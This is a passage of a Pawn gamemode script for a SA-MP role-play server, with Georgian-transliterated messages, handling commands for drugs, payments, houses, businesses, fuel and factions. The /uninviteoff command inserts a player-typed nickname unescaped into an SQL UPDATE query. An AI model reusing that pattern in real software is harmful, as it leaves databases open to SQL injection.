			UpdatePlayerData(playerid, "grain", pData[playerid][pGrain]);
			format(string, sizeof(string), "Shen Miyide %d Marcvali: %d$", ammo,ammo*50);
			SendClientMessage(playerid, CBLUE, string);
		}
	}
	if(strcmp(cmd, "/drugs", true) == 0)
	{
	    if(GetPVarInt(playerid,"USE_INV") < gettime()) return SendClientMessage(playerid,CGREEN,"Daachire Klavishs 'N' -> Inventory -> Narkotiki");
	    if(GetPVarInt(playerid,"DrugPRIN") == 1) return SendClientMessage(playerid,CGRAY,"Daelodet, Jer Ar Gasula Dzveli Efeqti.");
 		if(!pData[playerid][pDrugs]) return SendClientMessage(playerid,CGRAY,"Shen Ar Gaqvs Narkotiki");
		SetPlayerWeather(playerid, -68);
		SetPlayerDrunkLevel(playerid, 3000);
 		ApplyAnimation(playerid,"SMOKING","M_smk_drag",4.1,0,0,0,0,0,1);
 		if(pData[playerid][pHealth] < 150.0) SetPlayerHealthEx(playerid,pData[playerid][pHealth]+20.0);
        MeAction(playerid,"Gamoiyene Narkotiki");
        GameTextForPlayer(playerid, "~y~-1 g", 100, 1);
		pData[playerid][pDrugs] -= 1;
		Pokaz(playerid,4,1,0);
		UpdatePlayerData(playerid, "drugs", pData[playerid][pDrugs]);
		SetTimerEx("Drugs",50000,false,"i",playerid);
		SetPVarInt(playerid,"DrugPRIN",1);
		return true;
	}
	if(!strcmp(cmd,"/anim",true))
	{
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp))
		{
			new stringiser[1720];
			new Animser[][] = {
				{"1. Cekva - 1\n2. Cekva - 2\n3. Cekva - 3\n4. Cekva - 4\n5. Dealer\n6. Gadasca Ragaca\n7. Shechama Ragaca\n8. Sheikra Sharvali\n9. Meditacia\n10. Dachrili Jdoma\n11. Dzili\n12. Wamowola\n13. Xelis Wamortyma\n14. Xatva 1\n15. Xatva 2\n16. Moweva\n17. Dzarcva\n18. Maskis Gaketeba\n19. Xelebi Magla\n20. Dadzaxeba\n21. Xelebis Aweva\n22. Mxardamcheri 1\n23. Mxardamcheri 2\n24. Mxardamcheri 3\n"},
				{"25. Sashualo Titis Chveneba\n26. Dalia Ragaca\n27. Xelebis Qneba\n28. Kacuri Moweva\n29. Dawola 1\n30. Dawola 2\n31. Dawola 3\n32. Dawola 4\n33. Wamojdoma\n34. Rap 1\n35. Rap 2\n36. Rap 3\n37. Rap 4\n38. Burtis Chawodeba\n39. Burtis Gadagdeba\n40. Burtis Ageba\n41. Dadzaxeba\n42. Manqanis Keteba\n43. Avtomobiltan Midgoma\n44. Dealer 2\n"},
				{"45. Gichiravs Bita 1\n46. Gichiravs Bita 2\n47. Gangsteruli Jesti 1\n48. Gangsteruli Jesti 2\n49. Gangsteruli Jesti 3\n50. Gangsteruli Jesti 4\n51. Gangsteruli Jesti 5\n52. Gangsteruli Jesti 6\n53. Gangsteruli Jesti 7\n54. Gangsteruli Jesti 8\n55. Tirili\n56. Dajdoma 1\n57. Dajdoma 2\n58. Dajdoma 3\n59. Qaluri Moweva\n60. Xelovnuri Suntqva\n61. Miyudeba\n62. Miyudeba 2\n63. Facepalm\n64. Mopxanva"}
			};
			stringiser = "";
			format(stringiser, sizeof(stringiser), "%s%s%s", Animser[0], Animser[1], Animser[2]);
			ShowPlayerDialog(playerid,dAnimliber,DIALOG_STYLE_LIST, "Animlist", stringiser, "Archeva", "Daxurva");
		}
		return true;
 	}
	if(!strcmp(cmd,"/pass",true))
	{
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/pass [ID Motamashis]");
		new actplayerid = strval(tmp);
		if(!IsPlayerConnected(actplayerid)) return SendClientMessage(playerid,CGRAY,"Araswori ID Motamashis");
		if(GetPlayerDistanceToPlayer(playerid,actplayerid) > 3.0 || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(actplayerid)) return SendClientMessage(playerid,CGRAY,"Tqven Xart Shors Ertmanetisgan");
		format(mes,sizeof(mes),"Shen Anaxe {"#cWHITE"}%s {"#cINFO"} Sheni Pasporti.",Name2(actplayerid));
		SendClientMessage(playerid,CINFO,mes);
		format(mes,sizeof(mes),"%s {"#cINFO"}Surs Rom Gachvenot Tavisi Pasporti.",Name2(playerid));
		SendClientMessage(actplayerid,CWHITE,mes);
		SendClientMessage(actplayerid,CINFO,"Amis Dasadastureblad Daachiret {"#cGREEN"}Y{"#cINFO"}, Uaryofistvis {"#cRED"}N");
		pTemp[actplayerid][pShowPasspl] = playerid;
		pTemp[actplayerid][pShowPassact] = actplayerid;
	}
	if(!strcmp(cmd,"/pay",true))
	{
	    if(pData[playerid][pLevel] < 2) return SendClientMessage(playerid,CGRAY,"Fulis Gadaricxva Shesadzlebelia 2 LVL-Dan.");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/pay [ID Motamashis] [Raodenoba]");
		new actplayerid = strval(tmp);
		if(!IsPlayerConnected(actplayerid) || playerid == actplayerid) return SendClientMessage(playerid,CGRAY,"Araswori ID Motamashis.");
		if(GetPlayerDistanceToPlayer(playerid,actplayerid) > 3.0 || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(actplayerid)) return SendClientMessage(playerid,CGRAY,"Tqven Xart Shors Ertmanetisgan");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/pay [ID Motamashis] [Raodenoba]");
		new money = strval(tmp);
		if(money < 1 || money > 1000000) return SendClientMessage(playerid,CGRAY,"Sheidzleba 1-Dan 1000000-Mde Fulis Gacema.");
		if(GetPlayerMoneyEx(playerid) < money) return SendClientMessage(playerid,CGRAY,"Argaq Sakmarisi Tanxa.");
		if(GetPlayerState(playerid) == PLAYER_STATE_PASSENGER)
		{
			for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
			{
  				i = cvector_get(players, idxf);
				if(!IsPlayerConnected(i)) continue;
				if(pTemp[i][pTaxiPass] == playerid) return SendClientMessage(playerid,CGRAY,"Tqven Ver Gadaricxavt Tanxas Sanamar Gadaixdit Mgavrobis Fuls.");
			}
		}
		TransferMoney(playerid,actplayerid,money);
		format(mes,sizeof(mes),"%s {"#cINFO"}Mogcat Tqven {"#cGREEN"}$%d",Name2(playerid),money);
		SendClientMessage(actplayerid,CWHITE,mes);
		format(mes,sizeof(mes),"Tqven Miecit {"#cWHITE"}%s {"#cRED"}$%d",Name2(actplayerid),money);
		SendClientMessage(playerid,CINFO,mes);
		format(mes,sizeof(mes),"Aigo Fuli Da Gadasca: %s",Name2(actplayerid));
		MeAction(playerid,mes);
	}
	if(!strcmp(cmd,"/me",true))
	{
		if(pData[playerid][pMut]) return SendClientMessage(playerid,CGRAY,"Shen Gadevs Mute.");
		tmp = strrest(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/me [Moqmedeba]");
		if(IsIP(tmp) || CheckString(tmp)) return Proverka(playerid, tmp);
		MeAction(playerid,tmp);
	}
	if(!strcmp(cmd,"/do",true))
	{
		if(pData[playerid][pMut]) return SendClientMessage(playerid,CGRAY,"Shen Gadevs Mute.");
		tmp = strrest(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/do [Moqmedeba]");
		if(IsIP(tmp) || CheckString(tmp)) return Proverka(playerid, tmp);
		DoAction(playerid,tmp);
	}
	if(!strcmp(cmd,"/try",true))
	{
		if(pData[playerid][pMut]) return SendClientMessage(playerid,CGRAY,"Shen Gadevs Mute.");
		tmp = strrest(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/try [Moqmedeba]");
		if(IsIP(tmp) || CheckString(tmp)) return Proverka(playerid, tmp);
		TryAction(playerid,tmp);
	}
	if(!strcmp(cmd,"/fixcar",true))
	{
	    if(GetPlayerMoneyEx(playerid) < 1500) return SendClientMessage(playerid,CGRAY,"Arasakmarisi Tanxa. Sachiroa $1500");
		if(!pData[playerid][pCar] || (!pData[playerid][pHouse])) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gyavt Avtomobili");
		SetVehicleToRespawn(gVehicles[pData[playerid][pHouse]][vvID]);
		AddVehicleComponent(gVehicles[pData[playerid][pHouse]][vvID], pData[playerid][pKolesocar]);
		SendClientMessage(playerid,CGREEN,"Tqveni Manqana Gachnda Saxltan");
		TransferMoney(playerid,-1,1500);
	}
	if(!strcmp(cmd, "/start", true))
	{
	    if(PlayerToPoint(2.5,playerid,1126.3976,3.0198,1000.6797) || PlayerToPoint(2.5,playerid,1134.8831,-1.7416,1000.6797) || PlayerToPoint(2.5,playerid,1125.1093,-3.8803,1000.6797) || PlayerToPoint(2.5,playerid,1125.2041,0.6031,1000.6797))
	    {
	        cmd = strtok(cmdtext,idx);
		    if(!strlen(cmd)) return SendClientMessage(playerid,CGRAY,"/start [Tanxa]");
		    new money = strval(cmd);
		    if(money < 5000) return SendClientMessage(playerid,CGRAY,"Minimum: 5000$");
		    if(money > GetPlayerMoneyEx(playerid)) return SendClientMessage(playerid,CGRAY,"Arasakmarisi Tanxa");
			PutPlayerInSlotMachine(playerid,_,money);
			return true;
	    }
	}
	if(!strcmp(cmd, "/exitcamera", true))
	{
	    if(GetPVarInt(playerid,"IsInKamera") == 3) SetPVarInt(playerid,"IsInKamera",2), SetPlayerPos(playerid,-315.0161,-267.5797,1082.7289);
	}
	if(!strcmp(cmd, "/exithotel", true))
	{
	    if(PlayerToPoint(3,playerid,-2168.4731,642.3249,1057.5938))
	    {
	        if(pData[playerid][pOtel] < 1) return true;
	        SetPlayerVirtualWorld(playerid,pData[playerid][pOtel]);
	        SetPlayerInterior(playerid,18);
	        switch(pData[playerid][pOtelNomer])
	        {
	            case 1: SetPlayerPos(playerid,1708.7024,-1670.2324,23.7057);
	            case 2: SetPlayerPos(playerid,1708.7043,-1665.0304,23.7044);
	            case 3: SetPlayerPos(playerid,1708.7029,-1659.8270,23.7031);
	            case 4: SetPlayerPos(playerid,1708.7021,-1654.5770,23.7018);
	            case 5: SetPlayerPos(playerid,1708.7019,-1649.3079,23.6953);
	            case 6: SetPlayerPos(playerid,1735.0483,-1642.2540,23.7578);
	            case 7: SetPlayerPos(playerid,1735.0646,-1648.1945,23.7448);
	            case 8: SetPlayerPos(playerid,1735.0820,-1654.0867,23.7318);
	            case 9: SetPlayerPos(playerid,1735.0988,-1660.0123,23.7188);
	            case 10: SetPlayerPos(playerid,1708.7017,-1670.2111,27.1953);
	            case 11: SetPlayerPos(playerid,1708.7028,-1665.0184,27.1953);
	            case 12: SetPlayerPos(playerid,1708.7098,-1659.7622,27.1953);
	            case 13: SetPlayerPos(playerid,1708.7083,-1654.5234,27.1953);
	            case 14: SetPlayerPos(playerid,1708.7184,-1649.2904,27.1953);
	            case 15: SetPlayerPos(playerid,1735.0482,-1642.3508,27.2392);
	            case 16: SetPlayerPos(playerid,1735.0631,-1648.2434,27.2304);
	            case 17: SetPlayerPos(playerid,1735.0767,-1654.1727,27.2216);
	            case 18: SetPlayerPos(playerid,1735.0927,-1660.0815,27.2128);
	        }
	    }
	}
	if(!strcmp(cmd, "/gohome", true))
 	{
 	    if(GetPVarInt(playerid, "balkon") == 1)
 	    {
 	        SetPlayerPos(playerid,-2168.4741,642.1261,1057.5938);
			SetPlayerInterior(playerid, 1);
			SetPlayerVirtualWorld(playerid,playerid);
			SetPVarInt(playerid,"balkon",0);
 	    	return true;
 	    }
 	    if(PlayerToPoint(3,playerid,1380.5771,-13.3953,1000.9246))
 	    {
 	        SetPlayerVirtualWorld(playerid,pData[playerid][pHouse]);
			new interior, Float:r;
			new houseid = pData[playerid][pHouse] - 1;
			new hint = gHouses[houseid][houseHint];
			new Float:x, Float:y, Float:z;
			GetPlayerPos(playerid,x,y,z);
			if(pData[playerid][pFraction])
			{
				if(gHouses[houseid][houseImprove][1])
				{
					if(GetString(Name2(playerid),gHouses[houseid][houseOwner])) SetPlayerSkin(playerid,pData[playerid][pSkin]);
					else SetPlayerSkin(playerid,pData[playerid][pFractionSkin]);
				}
				else SetPlayerSkin(playerid,pData[playerid][pFractionSkin]);
			}
			else SetPlayerSkin(playerid,pData[playerid][pSkin]);
			pTemp[playerid][pSelectedHouseID] = houseid;
			x = gHints[hint][hintSX];
			y = gHints[hint][hintSY];
			z = gHints[hint][hintSZ];
			r = gHints[hint][hintSR];
			interior = gHints[hint][hintInterior];
			SetPlayerInterior(playerid,interior);
			SetPlayerPos(playerid,x,y,z);
			SetPlayerFacingAngle(playerid,r);
			SetPVarInt(playerid,"IsInHouse",1);
			if(pData[playerid][pFraction]) SetPlayerColor(playerid,gFractionColor[pData[playerid][pFraction] - 1]);
			return true;
		}
 	}
 	if(!strcmp(cmd,"/gocar",true))
 	{
 	    if(PlayerToPoint(3,playerid,1394.4858,-19.7839,1000.9229)) {
 	    	ShowPlayerDialog(playerid,dGaraj,2,"Car Menu","1. Manqana Garajshi / Garaji\n2. Gasvla Saxlshi\n3. Shemcvleli Dvijoki","OK","CLOSE");
		}
	 }
 	if(!strcmp(cmd,"/kazna",true))
	{
		if(pData[playerid][pFraction] != 15) return SendClientMessage(playerid,CGRAY,"Tqven Ar Xart Meriis Tanamshromeli.");
		ShowPlayerDialog(playerid,dMeriya,2,"Biujeti","1. Informacia\n2. Sheitanet Fuli Biujetshi\n3. Aiget Fuli Biujetidan","OK","CLOSE");
	}
	if(!strcmp(cmd,"/home",true))
	{
		if(!pData[playerid][pHouse]) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Saxli.");
		ShowPlayerDialog(playerid,dHouseMenu,2,"Home Menu","1. Saxlis Gageba / Saxlis Daketva\n2. Informacia Saxlze\n3. Gaumjobeseba\n4. Saxlis Transportis Gayidva\n5. Saxlis Gayidva\n6. Garaji","OK","CLOSE");
	}
	if(!strcmp(cmd,"/evicting",true))
	{
		if(!pData[playerid][pHouse]) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Saxli.");
		new houseid = pData[playerid][pHouse]-1;
		if(GetString(Name2(playerid),gHouses[houseid][houseOwner])) return SendClientMessage(playerid,CGRAY,"Tqven Plobdet Saxls");
		new slot = -1;
		for(new i;i<3;i++)
		{
			if(gHouses[houseid][houseHabitID][i] == pData[playerid][pMysqlID]) {slot = i; break;}
		}
		if(slot == -1) return SendClientMessage(playerid,CGRAY,"Tqvenar shegildziat Gadaadgildet Radgan Argaqvt Sakutari Saxli");
		gHouses[houseid][houseHabitID][slot] = 0;
		strdel(gHouseHabits[houseid][slot],0,24);
		new query[128];
		format(query,sizeof(query),"UPDATE `houses` SET `inhabit%did`='0', `inhabit%d`='' WHERE `id`='%d'",slot+2,slot+2,houseid+1);
		mysql_empty(mysql, query);
		pData[playerid][pHouse] = 0;
		UpdatePlayerData(playerid,"house",0);
		SendClientMessage(playerid,CINFO,"Tqven Gamogasaxles Saxlidan");
	}
	if(!strcmp(cmd,"/business",true))
	{
		if(pData[playerid][pBusiness] < 1) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Biznesi.");
		if(!GetString(Name2(playerid),gBusiness[pData[playerid][pBusiness]-1][busiOwner])) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Biznesi.");
		ShowPlayerDialog(playerid,dBusiness,2,"Bizness Menu","1. Salaros Martva\n2. Produqtis Shekveta\n3. Statistika\n4. Fasis Dakeneba\n5. Karis Daketva\n6. Biznesis Gakidva","OK","CLOSE");
	}
	if(!strcmp(cmd,"/sellbusiness",true))
	{
		if(pData[playerid][pBusiness] < 1) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Biznesi.");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/sellbusiness [ID Motamashis] [Tanxa]");
		new actplayerid = strval(tmp);
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/sellbusiness [ID Motamashis] [Tanxa]");
		new price = strval(tmp);
		if(!IsPlayerConnected(actplayerid)) return SendClientMessage(playerid,CGRAY,"Araswori ID Motamashis.");
		if(pData[actplayerid][pBusiness]) return SendClientMessage(playerid,CGRAY,"Motamashes Ukve Aqvs Biznesi.");
		if(price < 1 || price > 200000000) return SendClientMessage(playerid,CGRAY,"Fasi Unda Ikos $1-Dan 200Mil-Mde.");
		if(GetPlayerDistanceToPlayer(playerid,actplayerid) > 3.0 || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(actplayerid)) return SendClientMessage(playerid,CGRAY,"Tqven Xart Shors Ertmanetisgan");
		new businessid = -1;
		for(new i;i<gBusinessCount;i++)
		{
		    if(GetString(Name2(playerid),gBusiness[i][busiOwner])) {businessid = i; break;}
		}
		if(businessid == -1) return SendClientMessage(playerid,CGRAY,"Shecdoma. Biznesi Ar Aris Napovni.");
		format(mes,sizeof(mes),"Tqven Shestavazet {"#cWHITE"}%s {"#cINFO"} Iyidos Tqveni Biznesi",Name2(actplayerid));
		SendClientMessage(playerid,CINFO,mes);
		format(mes,sizeof(mes),"%s {"#cINFO"}Shemogtavazat Iyidot Misi Biznesi {"#cRED"}$%d{"#cINFO"}.",Name2(playerid),price);
		SendClientMessage(actplayerid,CWHITE,mes);
		SendClientMessage(actplayerid,CINFO,"Amis Dasadastureblad Daachiret {"#cGREEN"}Y{"#cINFO"}, Uaryofistvis {"#cRED"}N");
		SendClientMessage(actplayerid,CWHITE,"/binfo - {"#cINFO"}Biznesis Informaciis Sanaxavad.");
		pTemp[playerid][pSellBusinessOffer] = playerid;
		pTemp[actplayerid][pSellBusinessOffer] = playerid;
		pTemp[actplayerid][pSellBusinessOffee] = actplayerid;
		pTemp[actplayerid][pSellBusinessPrice] = price;
		pTemp[actplayerid][pSellBusinessID] = businessid + 1;
	}
	if(!strcmp(cmd,"/binfo",true))
	{
		if(!pTemp[playerid][pSellBusinessID]) return SendClientMessage(playerid,CGRAY,"Tqven Ar Shegitavazebiat Iyidos Biznesi.");
		ShowBusinessInformation(playerid,pTemp[playerid][pSellBusinessID]-1,dMes);
	}
	if(!strcmp(cmd,"/fill",true))
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid,CGRAY,"Tqven Unda Ijdet Avtomobilshi.");
		new vehicleid = GetPlayerVehicleID(playerid);
		//if(GetEngineStat(vehicleid) == 1) return SendClientMessage(playerid,CGRAY,"Заправляться можно только с заглушенным двигателем");
		new modelid = GetVehicleModel(vehicleid) - 400;
		if(!gTransport[modelid][trFuelable]) return SendClientMessage(playerid,CGRAY,"Tqvens Avtomobils Ar Aqvs Benzinis Avzi");
		new fillingid = -1;
		for(new i;i<FILLING_COUNT;i++)
		{
			if(!IsPlayerInDynamicArea(playerid,gAreas[arFill][i])) continue;
			else fillingid = i;
		}
		if(fillingid == -1) return SendClientMessage(playerid,CGRAY,"Shen Unda Ijde АЗС-Shi");
		ShowPlayerDialog(playerid,dFillBuy,0,"{1B8E06}Benzinis Shevseba","Gsurt Gaavsot Benzinis Avzi $700?","Gadaxda","Daxurva");
	}
	if(!strcmp(cmd,"/gun",true))
	{
		if(pData[playerid][pAdmin] < 3) return true;
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/gun [ID Iaragi] [Tyvia]");
		new gunid = strval(tmp);
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/gun [ID Iaragi] [Tyvia]");
		new ammo = strval(tmp);
		new guns[] = {4,9,16,26,27,32,37,38,35,36,39,44,45};
		for(new i= 0;i<sizeof(guns);i++) {
			if(guns[i] == gunid) return SendClientMessage(playerid, CGRAY, "Tqven Ar Shegidzliat Aigot Akrdzaluli Iaragi.");
		}
		GivePlayerWeaponEx(playerid,gunid,ammo);
	}
	if(!strcmp(cmd,"/store",true))
	{
		if(!pData[playerid][pHouse]) return SendClientMessage(playerid,CWHITE,"Tqven Ar Gaqvt Saxli.");
		new houseid = pData[playerid][pHouse] - 1;
		if(!GetString(Name2(playerid),gHouses[houseid][houseOwner])) return SendClientMessage(playerid,CGRAY,"Mxolod Saxlis Mflobels SHeudzlia Karadis Gamoyeneba");
		if(!gHouses[houseid][houseImprove][1]) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Karada.");
		new hintid = gHouses[houseid][houseHint];
		if(!IsPlayerInDynamicArea(playerid,gHintStoreArea[hintid])) return SendClientMessage(playerid,CGRAY,"Tqven Unda Iyot Axlos Karadastan");
		ShowPlayerDialog(playerid,dStore,2,"{"#cGREEN"}Karada: {ffffff}Menu","1. Iaragis Ageba\n2. Iaragis Shenaxva\n3. Tansacmlis Archeva\n4. Fuli Da Narkotiki","NEXT","CLOSE");
	}
	if(!strcmp(cmd,"/eat",true))
	{
		new hunger,name[32];
		switch(pTemp[playerid][pEat])
		{
			case 1: hunger = 100, name = "Hot-Dog", SetTimerEx("RemovePlayerAttachedObjectDelay",4000,false,"ii",playerid,1), SetPlayerAttachedObject(playerid,1,19346,6,0.059000,0.059999,0.000000,-97.399963,0.000000,0.000000);
			case 2: hunger = 150, name = "Burger", SetTimerEx("RemovePlayerAttachedObjectDelay",4000,false,"ii",playerid,1), SetPlayerAttachedObject(playerid,1,2703,6,0.079999,0.065999,0.015999,0.000000,-11.100000,84.900047,1.000000,1.000000,1.000000);
			case 3: hunger = 200, name = "KrabsBurger", SetTimerEx("RemovePlayerAttachedObjectDelay",4000,false,"ii",playerid,1), SetPlayerAttachedObject(playerid,1,2702,6,0.049000,0.056000,0.098999,73.800193,-104.900100,-11.700014,1.000000,1.000000,1.000000);
			case 4: SetPlayerAttachedObject(playerid,1,2703,6,0.079999,0.065999,0.015999,0.000000,-11.100000,84.900047,1.000000,1.000000,1.000000);
		    case 5: SetPlayerAttachedObject(playerid,1,2769,6,0.095999,0.073999,0.049000,-156.000030,-81.899986,12.599999,1.000000,1.000000,1.000000);
		    case 6: SetPlayerAttachedObject(playerid,1,2702,6,0.049000,0.056000,0.098999,73.800193,-104.900100,-11.700014,1.000000,1.000000,1.000000);
			case 7: SetPlayerAttachedObject(playerid,1,1546,5,0.126999,0.044999,-0.027000,15.999998,-175.499862,1.400000,1.000000,1.000000,1.000000);
			default: return true;
		}
	 	if(pTemp[playerid][pEat] >= 4 && pTemp[playerid][pEat] <= 7) {
		 	SetTimerEx("RemovePlayerAttachedObjectDelay",4000,false,"ii",playerid,1);
		 	format(name, 24, "%s", gEateryNames[pTemp[playerid][pEat] - 4]);
			hunger = 50;
		}
		SetPlayerSpecialAction(playerid, 0);
		ClearAnimations(playerid);
		RemovePlayerAttachedObject(playerid,0);
		if(pData[playerid][pHunger] <= 500) pData[playerid][pHunger] += hunger;
		if(pTemp[playerid][pEat] == 7) ApplyAnimation(playerid, "VENDING", "VEND_Drink2_P", 2.0,0,0,0,0,5000,1);
		else ApplyAnimation(playerid,"FOOD","EAT_Burger", 2.0,0,0,0,0,5000,1);
		format(mes,sizeof(mes),"Shechama(-а) %s",name);
		if(pTemp[playerid][pEat] == 7) format(mes, sizeof(mes), "Dalia %s", name);
		MeAction(playerid,mes);
		pTemp[playerid][pEat] = 0;
	}
	if(!strcmp(cmd,"/map",true))
	{
	    if(GetPVarInt(playerid,"USE_INV") < gettime()) return SendClientMessage(playerid,CGREEN,"Daachire Klavishs 'N' -> Inventory -> Ruka");
		MeAction(playerid,"Amoigo Ruka Jibidan");
		SetPlayerAttachedObject(playerid, 5, 19167, 6, 0.265382, 0.041968, 0.000000, 119.981117, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000);
		ShowPlayerDialog(playerid,dGPS,2,"{"#cGREEN"}Map: {ffffff}Airchiet Adgili","1. Samushao\n2. Xalxmravali Adgilebi\n3. Avtosaloni\n4. Rukis Gatishva","Archeva","Daxurva");
	}
	if(!strcmp(cmd,"/createorg",true))
 	{
 	    if(pData[playerid][pLevel] < 5) return SendClientMessage(playerid,CGRAY,"Unda Iyo 5LVL");
 	    if(pData[playerid][pOfforg] > 0) return SendClientMessage(playerid,CGRAY,"Tqven Ukve Xart Un.Off Organizaciashi");
 	    OffFrac += 1;
		pData[playerid][pOfforg] = OffFrac;
		pData[playerid][pOffrang] = 10;
		UpdatePlayerData(playerid,"offrang",pData[playerid][pOffrang]);
		UpdatePlayerData(playerid,"offorg",pData[playerid][pOfforg]);
		SendClientMessage(playerid,0x0072A8AA,"Tqven Sheqmenit Tqveni Un.Off Organizacia | /mm -> Commands -> Ara. Oficialuri");
	}
	if(!strcmp(cmd,"/invite",true))
	{
		if(!pData[playerid][pFraction]) return SendClientMessage(playerid,CGRAY,"Tqven Ar Xart Organizaciis Wevri");
		new fractionid = pData[playerid][pFraction] - 1;
		if(!IsAbleToHire(playerid)) return SendClientMessage(playerid,CGRAY,"Tqveni Ranki Ar Aris Sakmarisi");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/invite [ID Motamashis]");
		new actplayerid = strval(tmp);
		if(!IsPlayerConnected(actplayerid)) return SendClientMessage(playerid,CGRAY,"Araswori ID Motamashis");
		else if(pData[actplayerid][pFraction] && !(fractionid == 8 && pData[actplayerid][pFraction] == 8)) return SendClientMessage(playerid,CGRAY,"Motamashe Ukve Aris Sxva Organizaciashi");
		if(pData[actplayerid][pWarn]) return SendClientMessage(playerid,CGRAY,"Motamashes Aqvs Warn.");
        //if(pData[actplayerid][pLevel] < 2) return SendClientMessage(playerid,CGRAY,"Нельзя принять игрока, ниже 2 уровня");
		if(GetPlayerDistanceToPlayer(playerid,actplayerid) > 3.0 || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(actplayerid)) return SendClientMessage(playerid,CGRAY,"Tqven Xart Shors Ertmanetisgan");
		format(mes,sizeof(mes),"Tqven Shestavazet %s Shemouertdes Organizacias",Name2(actplayerid));
		SendClientMessage(playerid,CBLUE,mes);
		new mes2[128];
		format(mes2,sizeof(mes2),"%s Shemogtavazat Shemouertdet Mis Organizacias \"%s\"",Name2(playerid),gFractionName[fractionid]);
		pTemp[actplayerid][pOfferFraction] = playerid;
		pTemp[actplayerid][pOfferFractionid] = fractionid;
		SetPVarInt(playerid,"actinplayerid",actplayerid);
		ShowPlayerDialog(actplayerid,dInvite,0,"Organizaciashi Shesvla",mes2,"Tanxmoba","Uaryofa");
	}
	if(!strcmp(cmd,"/offadmins",true))
	{
	    if(pData[playerid][pAdmin] < 6) return true;
		mysql_tquery(mysql, "SELECT `nickname`, `admin`, `last` FROM `members` WHERE `admin` > '0'", "mysql_OffAdmins", "d", playerid);
	}
	if(!strcmp(cmd,"/offmembers",true))
	{
	    if(!pData[playerid][pFraction]) return SendClientMessage(playerid,CGRAY,"Tqven Ar Xart Organizaciis Wevri");
		new query[128];
	    if(pData[playerid][pSubfraction]) format(query, sizeof(query), "SELECT * FROM `members` WHERE `fraction` = '%d' AND `subfraction` = '%d'", pData[playerid][pFraction],pData[playerid][pSubfraction]);
		else format(query, sizeof(query), "SELECT * FROM `members` WHERE `fraction` = '%d' AND `subfraction` = '0'", pData[playerid][pFraction]);
		mysql_tquery(mysql, query, "mysql_OffMembers", "d", playerid);
 	}
	if(!strcmp(cmd,"/uninviteoff",true))
	{
	    if(!pData[playerid][pFraction]) return SendClientMessage(playerid,CGRAY,"Tqven Ar Xart Organizaciis Wevri");
		tmp = strrest(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/uninviteoff [Saxeli Motamashis]");
		new query[256];
		if(pData[playerid][pSubfraction])
		{
		    if(pData[playerid][pRank] < gFractionRankCount[pData[playerid][pFraction]-1]-1) return SendClientMessage(playerid,CGRAY,"Es Funqcia Xelmisawvdomia Mxolod Organizaciis Lideristvis.");
			format(query, sizeof(query), "UPDATE `members` SET `fraction` = '0' WHERE `nickname` = '%s' AND `fraction`='%d' AND `subfraction`='%d'", tmp, pData[playerid][pFraction], pData[playerid][pSubfraction]);
		}
		else
		{
			if(pData[playerid][pRank] < gFractionRankCount[pData[playerid][pFraction]-1]) return SendClientMessage(playerid,CGRAY,"Es Funqcia Xelmisawvdomia Mxolod Organizaciis Lideristvis.");
			format(query, sizeof(query), "UPDATE `members` SET `fraction` = '0' WHERE `nickname` = '%s' AND `fraction`='%d'", tmp, pData[playerid][pFraction]);
		}
		mysql_tquery(mysql, query, "mysql_uninviteoff", "ds", playerid, tmp);

		return true;
	}
	if(!strcmp(cmd,"/giverank",true))
	{
		if(!pData[playerid][pFraction]) return SendClientMessage(playerid,CGRAY,"Tqven Ar Xart Organizaciis Wevri");
		new fractionid = pData[playerid][pFraction] - 1;
		if(!IsAbleToUninvite(playerid)) return SendClientMessage(playerid,CGRAY,"Tqveni Ranki Ar Aris Sakmarisi");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/giverank [ID Motamashis]");
		new actplayerid = strval(tmp);
		if(!IsPlayerConnected(actplayerid) || actplayerid == playerid) return SendClientMessage(playerid,CGRAY,"Araswori ID Motamashis");
		if(pData[actplayerid][pFraction] != pData[playerid][pFraction] || pData[actplayerid][pSubfraction] != pData[playerid][pSubfraction]) return SendClientMessage(playerid,CGRAY,"Motamashe Ar Aris Tqvens Organizaciashi");
		if(pData[actplayerid][pRank] >= pData[playerid][pRank]) return SendClientMessage(playerid,CGRAY,"Tqveni Ranki Ar Aris Sakmarisi");
		SetPVarInt(playerid,"actgrplayerid",actplayerid);
		new mes2[512];
		new m = pData[playerid][pRank]-1;
